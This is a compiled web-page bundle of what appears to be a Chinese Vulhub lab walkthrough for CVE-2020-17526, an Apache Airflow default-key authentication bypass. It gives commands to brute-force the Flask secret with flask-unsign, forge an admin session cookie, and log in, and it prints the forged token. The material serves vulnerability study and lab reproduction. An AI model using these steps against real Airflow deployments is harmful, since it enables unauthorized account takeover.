import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as r,c as l,a as e,b as a,d as n,e as t}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,[a("Apache Airflow是一款开源的，分布式任务调度框架。默认情况下，Apache Airflow无需用户认证，但管理员也可以通过指定"),e("code",null,"webserver.authenticate=True"),a("来开启认证。")],-1),u=e("p",null,"在其1.10.13版本及以前，即使开启了认证，攻击者也可以通过一个默认密钥来绕过登录，伪造任意用户。",-1),h=e("p",null,"参考链接：",-1),m={href:"https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0",target:"_blank",rel:"noopener noreferrer"},g={href:"https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise",target:"_blank",rel:"noopener noreferrer"},f=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Apache Airflow 1.10.10：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#初始化数据库
docker-compose run airflow-init

#启动服务
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>服务器启动后，访问<code>http://your-ip:8080/admin/airflow/login</code>即可查看到登录页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先，我们访问登录页面，服务器会返回一个签名后的Cookie：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -v http://localhost:8080/admin/airflow/login
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948002.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,8),_={href:"https://github.com/Paradoxis/Flask-Unsign",target:"_blank",rel:"noopener noreferrer"},b=e("code",null,"SECRET_KEY",-1),v=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 安装flask-unsign
pip install flask-unsign[wordlist]

# 开始爆破
flask-unsign -u -c [session from Cookie]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948003.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Bingo，成功爆破出Key是<code>temporary_key</code>。使用这个key生成一个新的session，其中伪造<code>user_id</code>为1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>flask-unsign -s --secret temporary_key -c &quot;{&#39;user_id&#39;: &#39;1&#39;, &#39;_fresh&#39;: False, &#39;_permanent&#39;: True}&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948004.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>新生成的session为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoiMSJ9.YkJ2WQ.sUbyyQy70a2A6FPd6fO6UVAyQ-U
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在浏览器中使用这个新生成的session，可见已成功登录：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948005.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9),k={href:"https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=zh",target:"_blank",rel:"noopener noreferrer"};function x(y,w){const i=o("ExternalLinkIcon");return r(),l("div",null,[c,p,u,h,e("ul",null,[e("li",null,[e("a",m,[a("https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0"),n(i)])]),e("li",null,[e("a",g,[a("https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise"),n(i)])])]),f,e("p",null,[a("然后，使用"),e("a",_,[a("flask-unsign"),n(i)]),a("这个工具来爆破签名时使用的"),b,a("：")]),v,e("p",null,[a("可以使用Chrome插件"),e("a",k,[a("EditThisCookie"),n(i)]),a("对Cookie进行修改。")])])}const V=s(d,[["render",x],["__file","Apache Airflow 默认密钥导致的权限绕过 CVE-2020-17526.html.vue"]]);export{V as default};
